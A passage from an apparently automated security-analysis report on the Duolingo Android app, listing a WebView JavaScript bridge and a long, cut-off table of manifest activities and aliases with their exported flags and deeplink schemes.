### `org.prebid.mobile.rendering.views.webview.WebViewInterstitial`
- sources: java
- JS bridges: `jsBridge`

## Exported components

| kind | name | exported | deeplinks |
|------|------|----------|-----------|
| activity | `com.duolingo.splash.LaunchActivity` | True | duolingo://chess-puzzle<br>duolingo://chess-launch<br>duolingo://o<br>duolingo://daily-chess-puzzle |
| activity | `zendesk.support.guide.HelpCenterActivity` | False |  |
| activity | `zendesk.support.guide.ViewArticleActivity` | False |  |
| activity | `zendesk.support.request.RequestActivity` | False |  |
| activity | `zendesk.support.requestlist.RequestListActivity` | False |  |
| activity | `com.duolingo.session.SessionActivity` | False |  |
| activity | `com.duolingo.session.LandscapeSessionActivity` | False |  |
| activity | `com.duolingo.onboarding.WelcomeFlowActivity` | False |  |
| activity | `com.duolingo.onboarding.PlacementFallbackActivity` | False |  |
| activity | `com.duolingo.onboarding.SmecIntroActivity` | False |  |
| activity | `com.duolingo.onboarding.reactivation.ReactivatedWelcomeActivity` | False |  |
| activity | `com.duolingo.session.unitexplained.UnitTestExplainedActivity` | False |  |
| activity | `com.duolingo.session.unitexplained.UnitTestExplainedLandscapeActivity` | False |  |
| activity | `com.duolingo.session.SectionTestExplainedActivity` | False |  |
| activity | `com.duolingo.session.unitexplained.UnitReviewExplainedActivity` | False |  |
| activity | `com.duolingo.session.MistakesPracticeActivity` | False |  |
| activity | `com.duolingo.session.unitexplained.UnitReviewExplainedLandscapeActivity` | False |  |
| activity | `com.duolingo.stories.StoriesOnboardingActivity` | False |  |
| activity | `com.duolingo.settings.SettingsActivity` | False |  |
| activity | `com.duolingo.plus.management.ManageSubscriptionActivity` | False |  |
| activity | `com.duolingo.feedback.FeedbackFormActivity` | False |  |
| activity | `com.duolingo.profile.addfriendsflow.AddFriendsFlowActivity` | False |  |
| activity | `com.duolingo.profile.addfriendsflow.AddFriendsFlowFragmentWrapperActivity` | False |  |
| activity | `com.duolingo.profile.addfriendsflow.SearchFriendsActivity` | False |  |
| activity | `com.duolingo.profile.contacts.ContactsActivity` | False |  |
| activity | `com.duolingo.profile.contactsync.AddPhoneActivity` | False |  |
| activity | `com.duolingo.profile.suggestions.FollowSuggestionsActivity` | False |  |
| activity | `com.duolingo.signuplogin.CountryCodeActivity` | False |  |
| activity | `com.duolingo.profile.ProfileActivity` | False |  |
| activity | `com.duolingo.feature.avatar.AvatarBuilderActivity` | False |  |
| activity | `com.duolingo.profile.completion.CompleteProfileActivity` | False |  |
| activity | `com.duolingo.rampup.RampUpIntroActivity` | False |  |
| activity | `com.duolingo.home.sidequests.SidequestIntroActivity` | False |  |
| activity | `com.duolingo.profile.schools.SchoolsActivity` | False |  |
| activity | `com.duolingo.signuplogin.OktaCallbackActivity` | True | duolingo://okta |
| activity | `com.duolingo.signuplogin.SignupActivity` | False |  |
| activity | `com.duolingo.signuplogin.AddPhoneActivity` | False |  |
| activity | `com.duolingo.signuplogin.AddEmailActivity` | False |  |
| activity | `com.duolingo.signuplogin.forgotpassword.ForgotPasswordActivity` | False |  |
| activity | `com.duolingo.plus.dashboard.PlusActivity` | False |  |
| activity | `com.duolingo.plus.management.PlusCancelSurveyActivity` | False |  |
| activity | `com.duolingo.plus.management.PlusFeatureListActivity` | False |  |
| activity | `com.duolingo.plus.purchaseflow.PlusPurchaseFlowActivity` | False |  |
| activity | `com.duolingo.plus.onboarding.WelcomeToPlusActivity` | False |  |
| activity | `com.duolingo.plus.onboarding.PlusOnboardingSlidesActivity` | False |  |
| activity | `com.duolingo.plus.onboarding.ImmersiveFamilyPlanOwnerOnboardingActivity` | False |  |
| activity | `com.duolingo.sessionend.ads.PlusPromoVideoActivity` | False |  |
| activity | `com.duolingo.plus.onboarding.ImmersiveMaxFamilyPlanOwnerOnboardingActivity` | False |  |
| activity | `com.duolingo.sessionend.immersive.ImmersivePlusIntroActivity` | False |  |
| activity | `com.duolingo.sessionend.immersive.ImmersiveReassuranceActivity` | False |  |
| activity | `com.duolingo.sessionend.immersive.ExtendedImmersiveForTopLearnersActivity` | False |  |
| activity | `com.duolingo.energy.RewardedVideoForEnergyActivity` | False |  |
| activity | `com.duolingo.session.start.sponsored.SponsoredUnlimitedEnergyOfferActivity` | False |  |
| activity | `com.duolingo.session.start.sponsored.SponsoredUnlimitedEnergyReminderActivity` | False |  |
| activity | `com.duolingo.shop.RewardedVideoAwardActivity` | False |  |
| activity | `com.duolingo.energy.FullscreenEnergyDrawerActivity` | False |  |
| activity | `com.duolingo.energy.EnergyDripConfirmationActivity` | False |  |
| activity | `com.duolingo.streak.streakWidget.widgetPromo.BoostedEnergyWidgetConfirmationActivity` | False |  |
| activity | `com.duolingo.home.path.PathChestRewardActivity` | False |  |
| activity | `com.duolingo.home.path.rewards.PathTieredChestHostActivity` | False |  |
| activity | `com.duolingo.home.path.SectionOverviewActivity` | False |  |
| activity | `com.duolingo.shop.ShopPageWrapperActivity` | False |  |
| activity | `com.duolingo.streak.drawer.StreakDrawerWrapperActivity` | False |  |
| activity | `com.duolingo.feature.avatar.suits.SuitsEventActivity` | False |  |
| activity | `com.duolingo.feature.shardcollections.ShardCollectionsActivity` | False |  |
| activity | `com.duolingo.feature.liveevents.rewardroad.RewardRoadActivity` | False |  |
| activity | `com.duolingo.streak.earnback.StreakEarnbackProgressActivity` | False |  |
| activity | `com.duolingo.referral.ReferralInterstitialActivity` | False |  |
| activity | `com.duolingo.goals.monthlychallenges.MonthlyChallengeIntroActivity` | False |  |
| activity | `com.duolingo.xpboost.XpBoostAnimatedRewardActivity` | False |  |
| activity | `com.duolingo.feed.FeedCommentReportActivity` | False |  |
| activity | `com.duolingo.messages.dialogs.AgeBackfillAgeInputActivity` | False |  |
| activity | `com.duolingo.adventures.AdventuresEpisodeActivity` | False |  |
| activity | `com.duolingo.alphabets.AlphabetsTipListActivity` | False |  |
| activity | `com.duolingo.plus.registration.WelcomeRegistrationActivity` | False |  |
| activity | `com.duolingo.explanations.SkillTipActivity` | False |  |
| activity | `com.duolingo.explanations.AlphabetsTipActivity` | False |  |
| activity | `com.duolingo.explanations.GuidebookActivity` | False |  |
| activity | `com.duolingo.explanations.OnboardingDogfoodingActivity` | False |  |
| activity | `com.duolingo.signuplogin.ResetPasswordActivity` | False |  |
| activity | `com.duolingo.stories.StoriesSessionActivity` | False |  |
| activity | `com.duolingo.duoradio.DuoRadioSessionActivity` | False |  |
| activity | `com.duolingo.legendary.LegendaryFailureActivity` | False |  |
| activity | `com.duolingo.legendary.LegendaryIntroActivity` | False |  |
| activity | `com.duolingo.ai.videocall.promo.VideoCallPurchasePromoActivity` | False |  |
| activity | `com.duolingo.web.WebViewActivity` | False |  |
| activity | `com.duolingo.core.offline.ui.MaintenanceActivity` | False |  |
| activity | `com.duolingo.plus.familyplan.FamilyPlanLandingActivity` | False |  |
| activity | `com.duolingo.plus.familyplan.FamilyPlanConfirmActivity` | False |  |
| activity | `com.duolingo.plus.familyplan.FamilyPlanInvalidActivity` | False |  |
| activity | `com.duolingo.plus.familyplan.FamilyPlanAlreadySuperActivity` | False |  |
| activity | `com.duolingo.plus.familyplan.FamilyPlanKudosListActivity` | False |  |
| activity | `com.duolingo.plus.onboarding.PlusOnboardingNotificationsActivity` | False |  |
| activity | `com.duolingo.plus.familyplan.ManageFamilyPlanActivity` | False |  |
| activity | `com.duolingo.promocode.RedeemPromoCodeActivity` | False |  |
| activity | `com.duolingo.leagues.LeagueRepairOfferWrapperActivity` | False |  |
| activity | `com.duolingo.report.ReportActivity` | False |  |
| activity | `com.duolingo.settings.privacy.DeleteAccountActivity` | False |  |
| activity | `com.duolingo.feature.score.ScoreDetailActivity` | False |  |
| activity | `com.duolingo.debug.DebugActivity` | False |  |
| activity | `com.duolingo.debug.PromoDebugActivity` | False |  |
| activity | `com.duolingo.debug.EnergyDebugActivity` | False |  |
| activity | `com.duolingo.debug.ProgressBarAnimationsDebugActivity` | False |  |
| activity | `com.duolingo.ai.roleplay.RoleplayActivity` | False |  |
| activity | `com.duolingo.ai.videocall.VideoCallActivity` | False |  |
| activity | `com.duolingo.chess.match.ChessMatchActivity` | False |  |
| activity | `com.duolingo.chess.minimatch.ChessMiniMatchActivity` | False |  |
| activity | `com.duolingo.math.tutor.MathTutorActivity` | False |  |
| activity | `com.duolingo.chess.gamereview.ChessGameReviewActivity` | False |  |
| activity | `com.duolingo.chess.pvp.ChessPvpActivity` | False |  |
| activity | `com.duolingo.feature.chess.matchtab.inappinvite.ChessFriendPvpInAppInviteActivity` | False |  |
| activity | `com.duolingo.chess.pvp.ChessFriendPvpSplashScreenActivity` | False |  |
| activity | `com.duolingo.ai.ema.ui.FreeEmaAnnouncementActivity` | False |  |
| activity | `com.duolingo.ai.ema.ui.hook.EmaHookActivity` | False |  |
| activity | `com.duolingo.debug.DesignGuidelinesActivity` | False |  |
| activity | `com.duolingo.debug.PicassoExampleActivity` | False |  |
| activity | `com.duolingo.debug.coach.LessonCoachDebugActivity` | False |  |
| activity | `com.duolingo.leagues.LeaguesResultDebugActivity` | False |  |
| activity | `com.duolingo.stories.StoriesDebugActivity` | False |  |
| activity | `com.duolingo.rewards.RewardsDebugActivity` | False |  |
| activity | `com.duolingo.rewards.AddFriendsRewardsActivity` | False |  |
| activity | `com.duolingo.liveevents.EventsSocialCollaborationIntroActivity` | False |  |
| activity | `com.duolingo.liveevents.EventsIndividualOptInIntroActivity` | False |  |
| activity | `com.duolingo.goals.friendsquest.SocialQuestRewardActivity` | False |  |
| activity | `com.duolingo.debug.animation.LottieTestingActivity` | False |  |
| activity | `com.duolingo.debug.LargeLoadingIndicatorDebugActivity` | False |  |
| activity | `com.duolingo.debug.animation.PreviewAnimationDebugActivity` | False |  |
| activity | `com.duolingo.debug.animation.RiveTestingActivity` | False |  |
| activity | `com.duolingo.debug.score.ScoreTrophyRiveTestingActivity` | False |  |
| activity | `com.duolingo.debug.networking.NetworkTestingActivity` | False |  |
| activity | `com.duolingo.debug.ui.TypographyTokenGalleryActivity` | False |  |
| activity | `com.duolingo.debug.DiskAnalysisActivity` | False |  |
| activity | `com.duolingo.debug.DebugMemoryLeakActivity` | False |  |
| activity | `com.duolingo.debug.ResourceManagerExamplesActivity` | False |  |
| activity | `com.duolingo.debug.BackendTutorialActivity` | False |  |
| activity | `com.duolingo.debug.MessagesDebugActivity` | False |  |
| activity | `com.duolingo.debug.CountryOverrideActivity` | False |  |
| activity | `com.duolingo.debug.sessionend.SessionEndDebugActivity` | False |  |
| activity | `com.duolingo.notifications.NotificationTrampolineActivity` | False |  |
| activity | `com.duolingo.streak.streakWidget.WidgetDebugActivity` | False |  |
| activity | `com.duolingo.streak.streakWidget.SduiWidgetDebugActivity` | False |  |
| activity | `com.duolingo.debug.NotificationOptInBannerDebugActivity` | False |  |
| activity | `com.duolingo.debug.CalendarEventDebugActivity` | False |  |
| activity | `com.duolingo.debug.StreakAlarmDebugActivity` | False |  |
| activity | `com.duolingo.notifications.debug.TriggerNotificationDebugActivity` | False |  |
| activity | `com.duolingo.debug.ResurrectionDebugActivity` | False |  |
| activity | `com.duolingo.debug.FriendsStreakDebugActivity` | False |  |
| activity | `com.duolingo.debug.StreakFreezeGiftDebugActivity` | False |  |
| activity | `com.duolingo.debug.tieredchest.TieredChestDebugActivity` | False |  |
| activity | `com.duolingo.debug.hapticsplayer.HapticsPlayerDebugActivity` | False |  |
| activity | `com.duolingo.debug.StreakStateDebugActivity` | False |  |
| activity | `com.duolingo.debug.streaktiering.StreakTieringDebugActivity` | False |  |
| activity | `com.duolingo.debug.GiftingHubDebugActivity` | False |  |
| activity | `com.duolingo.debug.ComboRunDebugActivity` | False |  |
| activity | `com.duolingo.debug.AvatarSuitsDebugActivity` | False |  |
| activity | `com.duolingo.debug.FeatureFlagOverrideDebugActivity` | False |  |
| activity | `com.duolingo.feature.score.linkedin.LinkedInOAuthReceiverActivity` | True | duolingo-linkedin-android://score-linkedin-landing |
| activity | `com.duolingo.wechat.WeChatFollowInstructionsActivity` | False |  |
| activity | `com.duolingo.signuplogin.ForceConnectPhoneActivity` | False |  |
| activity | `com.duolingo.debug.ScoreDebugActivity` | False |  |
| activity | `com.duolingo.debug.ScoreResetPathDebugActivity` | False |  |
| activity | `com.duolingo.debug.math.MathSessionDebugSettingsActivity` | False |  |
| activity | `com.duolingo.debug.math.MathPathDebuggerActivity` | False |  |
| activity | `com.duolingo.debug.HomePathNodeRiveTestingActivity` | False |  |
| activity | `com.duolingo.debug.ads.AdsDebugScreenActivity` | False |  |
| activity | `com.duolingo.music.landing.SongLandingActivity` | False |  |
| activity | `com.duolingo.feature.hootcamp.HootcampDebugActivity` | False |  |
| activity | `com.duolingo.feature.music.ui.licensed.LicensedMusicPromoActivity` | False |  |
| activity | `com.facebook.FacebookActivity` | False |  |
| activity | `com.duolingo.core.util.facebook.PlayFacebookUtils$WrapperActivity` | False |  |
| activity | `com.duolingo.feature.appicon.quest.AppIconQuestActivity` | False |  |
| activity | `com.duolingo.feature.appicon.AppIconDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.session.settings.impl.SessionDebugActivity` | False |  |
| activity | `com.duolingo.feature.localization.livestrings.LiveStringsDebugActivity` | False |  |
| activity | `com.duolingo.feature.math.tutor.MathOnDemandActivity` | False |  |
| activity | `com.duolingo.feature.math.sandbox.MathSandboxActivity` | False |  |
| activity | `com.duolingo.feature.math.calculator.ScientificCalculatorActivity` | False |  |
| activity | `com.duolingo.feature.math.gradingfeedback.GradingFeedbackActivity` | False |  |
| activity | `com.duolingo.feature.sessionend.debug.SessionCompleteRiveTestingActivity` | False |  |
| activity | `com.duolingo.feature.timedevents.TimedChestsDebugActivity` | False |  |
| activity | `com.duolingo.feature.video.call.tab.debug.VideoCallHistoryDebugActivity` | False |  |
| activity | `com.duolingo.feature.video.call.tab.ui.history.detail.VideoCallHistorySessionActivity` | False |  |
| activity | `com.duolingo.feature.video.call.tab.ui.history.videomessage.VideoCallHistoryVideoMessageActivity` | False |  |
| activity | `com.duolingo.core.rive.modular.debug.ModularRiveDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.learning.challenge.LearningChallengeDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.music.betapath.MusicBetaPathDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.service.mapping.ServiceMappingDebugSettingActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.partnerevent.PartnerEventDebugSettingActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.video.call.VideoCallDebugSettingsActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.chess.ChessDebugSettingsActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.chess.ChessMatchStartingFenDebugSettingsActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.duo.world.DuoWorldDebugSettingsActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.prototype.PrototypeDebugSettingsActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.prototype.viewer.PrototypeViewerActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.shardcollections.ShardCollectionsDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.shardcollections.ShardDropSimulatorDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.shardcollections.LocalDuplicateShardsDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.shardcollections.GrandPrizeClaimDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.settings.shardcollections.BundlePurchaseDebugActivity` | False |  |
| activity | `com.duolingo.feature.debug.streak.OverrideStreakDataDebugActivity` | False |  |
| activity | `com.duolingo.feature.experiments.debug.ClientExperimentDebugScreenActivity` | False |  |
| activity | `com.duolingo.feature.yearinreview.debug.YearInReviewDebugActivity` | False |  |
| activity | `com.duolingo.feature.ads.CustomNativeAdActivity` | False |  |
| activity | `com.duolingo.feature.ads.FullscreenNetworkNativeAdActivity` | False |  |
| activity | `com.duolingo.feature.ads.sponsored.SponsoredInStreamAdActivity` | False |  |
| activity | `com.duolingo.feature.animation.tester.impl.AnimationTesterActivity` | False |  |
| activity | `com.duolingo.feature.chess.dailypuzzle.session.ChessDailyPuzzleActivity` | False |  |
| activity | `com.duolingo.feature.chess.dailypuzzle.home.ChessDailyPuzzleHomeActivity` | False |  |
| activity | `com.duolingo.feature.chess.sandbox.ChessSandboxActivity` | False |  |
| activity | `com.duolingo.feature.chess.splash.ChessSplashActivity` | False |  |
| activity | `com.duolingo.feature.music.ui.sandbox.note.MusicNoteSandboxActivity` | False |  |
| activity | `com.duolingo.feature.music.ui.sandbox.circletoken.MusicCircleTokenSandboxActivity` | False |  |
| activity | `com.duolingo.feature.music.ui.sandbox.draganddrop.MusicDragAndDropSandboxActivity` | False |  |
| activity | `com.duolingo.feature.music.ui.sandbox.scoreparser.MusicScoreParserSandboxActivity` | False |  |
| activity | `com.duolingo.feature.music.ui.sandbox.staffplay.MusicStaffPlaySandboxActivity` | False |  |
| activity | `com.duolingo.feature.music.ui.sandbox.audiotokenET.MusicAudioTokenETSandboxActivity` | False |  |
| activity | `com.duolingo.feature.score.linkedin.ScoreLinkedInManuallySyncActivity` | False |  |
| activity | `com.duolingo.core.wechat.WeChatReceiverActivity` | True |  |
| activity | `com.duolingo.feature.leagues.interstitial.LeaderboardInterstitialActivity` | False |  |
| activity | `com.duolingo.feature.yearinreview.report.YearInReviewReportActivity` | False |  |
| activity | `com.duolingo.feature.design.system.ComposeComponentGalleryActivity` | False |  |
| activity | `com.duolingo.feature.design.system.performance.ComposePerformanceDebugActivity` | False |  |
| activity | `com.duolingo.core.streak.alarm.StreakAlarmRingActivity` | False |  |
| activity | `com.duolingo.feature.secondarymembernudge.FamilyPlanSecondaryNudgeFlowActivity` | False |  |
| activity | `com.duolingo.feature.unity.MusicUnityActivity` | False |  |
| activity | `com.duolingo.feature.unity.DuoWorldUnityActivity` | False |  |
| activity | `com.duolingo.core.android.activity.test.EmptyEntryPointTestActivity` | False |  |
| activity | `com.moloco.sdk.xenoss.sdkdevkit.android.adrenderer.internal.templates.renderer.fullscreen.FullscreenWebviewActivity` | False |  |
| activity | `com.moloco.sdk.xenoss.sdkdevkit.android.adrenderer.internal.vast.VastActivity` | False |  |
| activity | `com.moloco.sdk.xenoss.sdkdevkit.android.adrenderer.internal.staticrenderer.StaticAdActivity` | False |  |
| activity | `com.moloco.sdk.xenoss.sdkdevkit.android.adrenderer.internal.mraid.MraidActivity` | False |  |
| activity | `zendesk.messaging.MessagingActivity` | False |  |
| activity | `androidx.credentials.playservices.controllers.identityauth.HiddenActivity` | False |  |
| activity | `androidx.credentials.playservices.controllers.identitycredentials.IdentityCredentialApiHiddenActivity` | False |  |
| activity | `com.unity3d.player.UnityPlayerGameActivity` | True |  |
| activity | `com.facebook.CustomTabMainActivity` | False |  |
| activity | `com.facebook.CustomTabActivity` | True | fbconnect://cct.com.duolingo |
| activity | `org.prebid.mobile.rendering.views.browser.AdBrowserActivity` | True |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTCeilingLandingPageActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTLandingPageActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTPlayableLandingPageActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTVideoLandingPageLink2Activity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTDelegateActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTWebsiteActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTAppOpenAdActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTAppOpenAdTransActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTRewardVideoActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTRewardExpressVideoActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTFullScreenVideoActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTFullScreenExpressVideoActivity` | False |  |
| activity | `com.bytedance.sdk.openadsdk.activity.single.TTAdActivity` | False |  |
| activity | `com.google.android.gms.auth.api.signin.internal.SignInHubActivity` | False |  |
| activity | `com.android.billingclient.api.ProxyBillingActivity` | False |  |
| activity | `com.android.billingclient.api.ProxyBillingActivityV2` | False |  |
| activity | `com.facebook.ads.AudienceNetworkActivity` | False |  |
| activity | `com.ironsource.sdk.controller.ControllerActivity` | False |  |
| activity | `com.ironsource.sdk.controller.InterstitialActivity` | False |  |
| activity | `com.ironsource.sdk.controller.OpenUrlActivity` | False |  |
| activity | `com.unity3d.services.ads.adunit.AdUnitActivity` | False |  |
| activity | `com.unity3d.services.ads.adunit.AdUnitTransparentActivity` | False |  |
| activity | `com.unity3d.services.ads.adunit.AdUnitTransparentSoftwareActivity` | False |  |
| activity | `com.unity3d.services.ads.adunit.AdUnitSoftwareActivity` | False |  |
| activity | `com.unity3d.ads.adplayer.FullScreenWebViewDisplay` | False |  |
| activity | `com.google.android.gms.common.api.GoogleApiActivity` | False |  |
| activity | `com.vungle.ads.internal.ui.VungleActivity` | False |  |
| activity | `com.google.android.gms.ads.AdActivity` | False |  |
| activity | `com.google.android.gms.ads.OutOfContextTestingActivity` | False |  |
| activity | `com.google.android.gms.ads.NotificationHandlerActivity` | False |  |
| activity | `androidx.compose.ui.tooling.PreviewActivity` | True |  |
| activity | `com.unity3d.ironsourceads.internal.services.InlineStoreActivity` | False |  |
| activity | `com.ironsource.mediationsdk.testSuite.TestSuiteActivity` | False |  |
| activity | `com.google.android.play.core.common.PlayCoreDialogWrapperActivity` | False |  |
| activity | `com.amazon.aps.ads.activity.ApsInterstitialActivity` | True |  |
| activity | `com.amazon.device.ads.DTBInterstitialActivity` | True |  |
| activity-alias | `com.duolingo.app.LoginActivity` | True |  |
| activity-alias | `com.duolingo.app.StreakSocietyLauncher` | True |  |
| activity-alias | `com.duolingo.app.SeasonalLauncher1` | True |  |
| activity-alias | `com.duolingo.app.SeasonalLauncher2` | True |  |
| activity-alias | `com.duolingo.app.SeasonalLauncher3` | True |  |
| activity-alias | `com.duolingo.app.SeasonalLauncher4` | True |  |
| activity-alias | `com.duolingo.app.SeasonalLauncher5` | True |  |
| activity-alias | `com.duolingo.app.FixedRetentionChallengeLauncher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver1Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver2Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver3Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver4Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver5Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver6Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver7Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver8Launcher` | True |  |
| activity-alias | `com.duolingo.app.PreStreakSaver9Launcher` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherEmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherHourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherAlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherSiren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherAlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherSirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherEyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncherInterrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2Hourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2AlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2AlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2ExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2SirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2Eyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher2Interrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3Hourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3AlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3AlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3ExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3SirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3Eyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher3Interrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4Hourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4AlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4AlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4ExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4SirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4Eyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4Interrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5Hourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5AlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5AlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5ExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5SirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5Eyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5Interrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6Hourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6AlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6AlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6ExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6SirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6Eyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6Interrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7Hourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7AlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7AlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7ExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7SirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7Eyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7Interrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLighting` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingEmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingHourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingAlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingSiren` | True |  |
